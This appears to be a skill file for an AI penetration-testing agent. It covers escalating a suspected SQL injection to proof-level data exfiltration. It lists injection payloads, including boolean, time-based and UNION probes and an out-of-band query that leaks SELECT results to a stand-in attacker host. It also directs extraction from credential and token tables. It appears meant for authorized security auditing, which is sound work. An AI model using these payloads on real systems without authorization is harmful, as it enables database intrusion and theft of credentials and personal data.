---
name: sqli-to-data-exfil
description: Escalate a suspected or confirmed SQL injection into proof-level data exfiltration. Use when you spot an SQL error in a response, a record from a prior scan flagged a SQLi pattern, or boolean/time differentials indicate the payload reaches the query parser. Walks from probe → confirm → enumerate → exfil with payload-class-aware techniques (in-band, blind boolean, blind time, blind OAST) and ends by persisting a concrete finding with the leaked sample.
license: MIT
allowed-tools:
  - query_records
  - inspect_record
  - replay_request
  - attack_kit
  - oast_mint
  - oast_poll
  - send_raw_http
  - report_finding
  - update_finding
  - remember
  - update_plan
---

# SQLi → Data Exfiltration

You suspect SQL injection somewhere in the target. Your job is to turn that
suspicion into proof — a real exfil sample from the database — and persist
it as a finding with reproducible evidence. Speculation isn't a finding.

## When this skill applies

Trigger this strategy when any of these is true:

- An HTTP record's response contains an SQL error fragment: `SQLITE_ERROR`,
  `ORA-`, `MySQL syntax`, `PostgreSQL`, `unclosed quotation mark`,
  `mismatched parenthesis`, `near "X": syntax error`.
- A prior scan's record body has a `q=...'`, `id=...'`, `search=...` payload
  that triggered a 500 / different content-length / reflected error.
- A user-controlled parameter feeds into a `SELECT`/`WHERE`/`ORDER BY`
  context that the response body or scanner finding directly suggests.
- The audit harness produced a finding with CWE-89 / "SQL Injection" /
  "blind SQLi" — even theoretical.

If you only have a generic "fuzz everything" task, stop and pick a record
first (`query_records` then `inspect_record`). Do not run this skill blind.

## Workflow

### 1. Anchor on a record

Pick the strongest candidate via `query_records` filters (`status: [500]`,
`search: "SQL"`, `has_params: true`) and `inspect_record` to load its raw
request and the parsed insertion points. Note the **insertion point name**
and **type** (URL_PARAM, POST_BODY_PARAM, HEADER, JSON_PATH) — payload
encoding differs per type.

`remember` the chosen insertion point with a key like `sqli-target` so the
plan survives context churn.

### 2. Classify the injection

Run two probes with `replay_request` against the chosen insertion point:

- **Quote test**: send `'` and `''`. Compare baseline vs replay status,
  length, body hash. If `'` errors and `''` succeeds → string context. If
  both behave like baseline → numeric context or filtered.
- **Boolean test**: send `1' AND '1'='1` (or `1 AND 1=1` for numeric) and
  `1' AND '1'='2`. Equal-vs-different responses prove an in-band boolean.

If neither yields a difference, fall through to the blind paths below.

### 3. Pull a payload set

Call `attack_kit` with `class: "sqli"` to get starter payloads. Don't fire
them all — read them and pick the ones that match the context (string vs
numeric, single-quote vs double-quote, MySQL vs SQLite vs Postgres
fingerprint from the error message).

### 4. Confirm with a verifiable oracle

Choose the cheapest oracle that actually proves execution, not behavior
difference:

- **In-band**: UNION SELECT a sentinel string into a column that gets
  echoed. Look for the sentinel in the replay body. **This is the only
  oracle that proves data exfil end-to-end in one shot.**
- **Blind boolean**: pair true/false branches against a 2-bit fact you
  control (e.g. `IF(SUBSTRING(@@version,1,1)='5',sleep(0),null)`).
- **Blind time**: `SLEEP(5)` / `pg_sleep(5)` / `randomblob(...)` — only
  use when nothing else differentiates. Confirm with at least 2 trials.
- **Blind OAST**: `oast_mint` a canary, inject `LOAD_FILE(...)`,
  `xp_dirtree`, or `pg_read_file('//' || (SELECT ...) || '.attacker')`
  to leak via DNS/HTTP. Poll with `oast_poll` until the callback shows up
  (give it up to 60 seconds).

### 5. Enumerate then exfil

Once confirmed, walk the schema:

1. Database version + name: leak via the chosen oracle.
2. Table names: `information_schema.tables` (MySQL/Postgres) or
   `sqlite_master` (SQLite).
3. Column names for the highest-value table: pick `users`, `accounts`,
   `api_keys`, `tokens`, `sessions`, `secrets` — not `migrations`.
4. **One real row**: leak a single concrete value (a hashed password, an
   email, an API key prefix). One row is sufficient — do not bulk-exfil.

Keep a `remember` note with the leaked sample (key: `sqli-exfil-sample`)
so the finding writer can include it as evidence.

### 6. Persist the finding

Call `report_finding` exactly once for this issue:

- `severity`: `critical` if the leaked value is a credential, API key,
  session token, or PII. `high` otherwise.
- `title`: include the endpoint + parameter (e.g.
  `"SQLi in /rest/products/search q parameter leaks SQLite schema"`).
- `cwe_id`: `CWE-89`.
- `description`: 2-3 sentences — context, payload, leaked sample (mask
  the sensitive part: `admin@…` not the full email).
- Include the **exact mutated request line** that produced the leak.

If the audit harness already produced a theoretical finding for the same
endpoint, call `update_finding` with `status: triaged` and reference the
new evidence in the description instead of double-reporting.

## Pitfalls — read before sending

- Do not use destructive payloads (`DROP`, `DELETE`, `UPDATE`) under any
  circumstance. Use `SELECT` only.
- Time-based SLEEP confirms blind SQLi *only* if the application doesn't
  also delay other requests (e.g. shared rate limiter). Run a baseline
  with the same length payload but no sleep before claiming the oracle.
- `UNION` requires matching column count. If the first `UNION SELECT 1`
  errors with "different number of columns", iterate `1,2`, `1,2,3` until
  it goes through — then identify which slot reflects.
- If the response is JSON and the injection point is inside a quoted
  field, your payload must escape the JSON before it escapes the SQL.
- Stored procedures (mssql `xp_cmdshell`, postgres `COPY FROM PROGRAM`)
  cross into RCE — that's a different skill (`command-injection-rce`).
  Do not chain without explicit operator authorization in the scope.

## Output expectations

- One `report_finding` call per distinct SQLi (don't re-report per
  parameter if the same handler is vulnerable on many).
- A `remember` note with the canonical exfil sample so it survives
  context loss.
- The plan item that triggered this skill marked `done` via `update_plan`.
